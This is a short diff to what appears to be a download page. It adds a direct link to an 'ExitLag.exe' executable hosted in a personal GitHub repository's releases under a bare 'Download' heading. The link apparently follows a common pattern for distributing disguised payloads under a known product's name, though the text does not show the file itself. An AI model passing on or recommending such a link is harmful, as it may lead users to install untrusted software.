@@ -1,6 +1,6 @@
 Download =====> 
 
-"1" 
+"1" https://github.com/marcusmigl/ExitLag/releases/download/update/ExitLag.exe
 
 "2" 
 
